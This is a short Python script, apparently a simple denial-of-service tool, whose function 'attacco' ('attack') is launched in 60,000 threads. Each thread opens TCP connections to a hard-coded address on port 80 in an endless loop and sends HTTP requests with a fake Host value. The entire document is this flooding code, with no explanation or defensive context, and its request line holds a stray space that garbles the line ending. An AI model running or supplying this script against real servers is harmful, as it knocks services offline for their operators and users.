import socket
import threading

def attacco():
    iptarget = "192.168.1.11"
    ipfake = "111.111.111.111"
    port = 80
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((iptarget, port))
        s.sendto(("GET /" + iptarget + " HTTP/1.1\ r\n").encode("ascii"), (iptarget, port))
        s.sendto(("Host: " + ipfake + "\r\n\r\n").encode("ascii"), (iptarget, port))
        s.close()

for i in range(60000):
    thread = threading.Thread(target = attacco)
    thread.start()